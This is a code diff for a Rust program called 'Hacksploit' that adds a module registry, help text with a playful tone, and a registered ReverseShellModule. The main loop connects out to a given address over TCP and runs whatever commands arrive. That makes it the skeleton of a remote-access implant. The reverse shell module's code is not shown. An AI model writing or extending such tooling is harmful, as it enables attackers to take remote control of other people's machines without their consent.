@@ -1,25 +1,42 @@
+use std::boxed::Box;
 use std::io::{Error, Read, Write};
 use std::net::TcpStream;
-use std::boxed::Box;
+
+use modules::reverse_shell::ReverseShellModule;
+
+mod modules;
+
+const WELCOME_MESSAGE: &str = "hey babes thanks for using this thing\n";
+const HELP_MESSAGE: &str = "so here's the help: \n{ENTRIES}\n";
+const EXIT_MESSAGE: &str = "oh :-( bye\n";
+const UNKNOWN_COMMAND: &str = "Unknown command. Please try again.\n";
 
 pub trait HacksploitModule {
-    fn on_command(&self, args: Vec<String>) -> String;
+    fn on_command(&self, args: Vec<&str>) -> String;
     fn get_name(&self) -> String;
+    fn get_description(&self) -> String;
 }
 
 pub struct HacksploitInstance {
     modules: Vec<Box<dyn HacksploitModule>>,
+    welcome_message: String,
+    help_message: String,
+    exit_message: String,
 }
 
 impl HacksploitInstance {
     pub fn new() -> Self {
         HacksploitInstance {
             modules: vec![],
+            welcome_message: String::from(WELCOME_MESSAGE),
+            help_message: String::from(HELP_MESSAGE),
+            exit_message: String::from(EXIT_MESSAGE),
         }
     }
 
-    pub fn register_module<T>(&mut self, module: T) where 
-        T: HacksploitModule + 'static
+    pub fn register_module<T>(&mut self, module: T)
+    where
+        T: HacksploitModule + 'static,
     {
         self.modules.push(Box::new(module));
     }
@@ -28,16 +45,39 @@ impl HacksploitInstance {
         let arr: Vec<&str> = data.split_whitespace().collect();
         let command = arr.get(0);
         if command.is_none() {
-            return String::from("unable to do it idk its weird \n");
+            return String::new();
         }
         let command = command.unwrap();
         let args = arr[1..].to_vec();
         for module in &self.modules {
-            if command.to_lowercase().starts_with(&module.get_name()) {
+            if command.eq_ignore_ascii_case(&module.get_name()) {
                 return module.on_command(args);
             }
         }
         String::new()
+    }
+
+    fn get_welcome_message(&self) -> String {
+        String::from(&self.welcome_message)
+    }
+
+    fn get_help_message(&self) -> String {
+        let mut entries: Vec<String> = vec![];
+        for module in &self.modules {
+            let entry_text = vec![
+                module.get_name().as_str(),
+                "-",
+                module.get_description().as_str(),
+            ]
+            .join(" ");
+            entries.push(entry_text);
+        }
+        let entries = entries.join("\n");
+        String::from(&self.help_message.replace("{ENTRIES}", &entries))
+    }
+
+    fn get_exit_message(&self) -> String {
+        String::from(&self.exit_message)
     }
 }
 
@@ -52,50 +92,44 @@ fn main() {
     }
 }
 
-fn bytes_from_str(s: &str) -> Vec<u8> {
-    return s.as_bytes().to_vec();
-}
-
 fn start(addr: &str) -> Result<(), Error> {
     let mut stream: TcpStream = TcpStream::connect(addr)?;
-    let instance: HacksploitInstance = HacksploitInstance::new();
+    let mut instance: HacksploitInstance = HacksploitInstance::new();
+    register_modules(&mut instance);
+    stream.write(instance.get_welcome_message().as_bytes())?;
+    stream.flush()?;
     loop {
         let mut buf = [0; 1024];
-        match stream.read(&mut buf) {
-            Ok(len) => {
-                if len == 0 {
+
+        stream.write(instance.get_help_message().as_bytes())?;
+        stream.flush()?;
+
+        let len = stream.read(&mut buf)?;
+        if len == 0 {
+            break;
+        }
+        let data = String::from_utf8(buf[..len].to_vec());
+        match data {
+            Ok(data) => {
+                if data.to_ascii_lowercase().starts_with("exit") {
+                    let response = instance.get_exit_message();
+                    let _ = stream.write(response.as_bytes());
+                    let _ = stream.flush();
                     break;
                 }
-                let data = String::from_utf8(buf[..len].to_vec());
-                match data {
-                    Ok(data) => {
-                        let response = bytes_from_str(&instance.on_command(data));
-                        match stream.write(&response) {
-                            Ok(_) => (),
-                            Err(e) => {
-                                println!("Error: {}", e);
-                                break;
-                            },
-                        }
-                        match stream.flush() {
-                            Ok(_) => (),
-                            Err(e) => {
-                                println!("Error: {}", e);
-                                break;
-                            }
-                        }
-                    },
-                    Err(e) => {
-                        println!("Error: {}", e);
-                        break;
-                    }
+                let mut response = instance.on_command(data);
+                if response.len() == 0 {
+                    response = String::from(UNKNOWN_COMMAND);
                 }
-            },
-            Err(e) => {
-                println!("Error: {}", e);
-                break;
-            },
+                stream.write(response.as_bytes())?;
+                stream.flush()?;
+            }
+            Err(_) => break,
         }
     }
     Ok(())
+}
+fn register_modules(instance: &mut HacksploitInstance) {
+    let reverse_shell = ReverseShellModule::new();
+    instance.register_module(reverse_shell);
 }
